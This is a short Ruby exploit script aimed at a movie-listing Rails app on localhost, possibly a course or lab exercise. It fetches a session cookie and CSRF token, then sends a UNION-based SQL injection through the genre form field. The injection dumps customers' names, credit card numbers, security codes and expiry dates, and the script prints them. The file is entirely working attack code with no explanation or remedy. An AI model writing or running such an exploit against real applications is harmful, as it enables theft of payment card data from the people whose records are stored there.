require 'socket'
require 'cgi'

def get_cookie
  get_req = "GET /movies/selectGenre HTTP/1.0" + "\r\n"
  get_req += "Host: localhost:3000\r\n"
  get_req += "Accept: text/xml,application/xml,application/xhtml+xml,text/html*/*" + "\r\n"
  get_req += "Accept-Language: en-us" + "\r\n"
  get_req += "Accept-Charset: iso-8859-1,*,utf-8" + "\r\n"
  get_req += "Content-Length: 0" + "\r\n"
  get_req += "Connection: close\r\n\r\n"

  get_req
end

def post_cookie(cookie, token, hack)
	body = "utf8=%E2%9C%93&authenticity_token="
	body += token
	body += "&genre=" + hack + "&commit=Show+Movies"
	#puts body
	post_req = "POST /movies/showGenre HTTP/1.0" + "\r\n"
	post_req += "Host: localhost:3000\r\n"
	post_req += "Accept: text/xml,application/xml,application/xhtml+xml,text/html*/*" + "\r\n"
  	post_req += "Accept-Language: en-us" + "\r\n"
  	post_req += "Accept-Charset: iso-8859-1,*,utf-8" + "\r\n"
  	post_req += "Content-Length: " + body.length.to_s + "\r\n"
  	post_req += "Content-Type: application/x-www-form-urlencoded" + "\r\n"
  	post_req += "Cookie: " + "_session_id=" + cookie + "; request_method=GET" +"\r\n"
  	post_req += "Connection: close\r\n\r\n"
	post_req += body + "\r\n"
  	post_req
end

#get request for authenticity token and session cookie
get_socket = TCPSocket.open("localhost", 3000)
get_req = get_cookie
get_socket.puts get_req
while (line = get_socket.gets) do
	if line =~ /_session_id=\S+/
		out = line[/_session_id=\S+/]
		out = out[/=\S+/].chop
		cookie = out.byteslice(1, out.length-1)
	end
	if line =~ /="authenticity_token" type="hidden" \S+/
		token = line[/authenticity_token" type="hidden" value\S+/]
		token = token[/value\S+/]
		token = token.byteslice(7, token.length-8)
	end
end
get_socket.close

#post request for credit card info
post_socket = TCPSocket.open("localhost", 3000)
hack = "Romance' AND 1=0 UNION SELECT billing_city as title, name as director, card_number as star, security_code as release_year, exp_month as genre, exp_year as rating, billing_city as id FROM customers --"
post_req = post_cookie(cookie, CGI::escape(token), CGI::escape(hack))
post_socket.puts post_req
while(line = post_socket.gets) do
	if (line =~/a href="\/movies/)
		line = line.byteslice(37, line.length-47)
		puts "Name: " + line
		line = post_socket.gets
		line = line.byteslice(12, line.length-18)
		puts "Credit Card Number: " + line
		line = post_socket.gets
		line = line.byteslice(12, line.length-18)
		puts "Security Code: " + line
		line = post_socket.gets
		line = line.byteslice(12, line.length-18)
		puts "Expiration Month: " + line
		line = post_socket.gets
		line = line.byteslice(12, line.length-18)
		puts "Expiration Year: " + line
		puts ""
	end
end
post_socket.close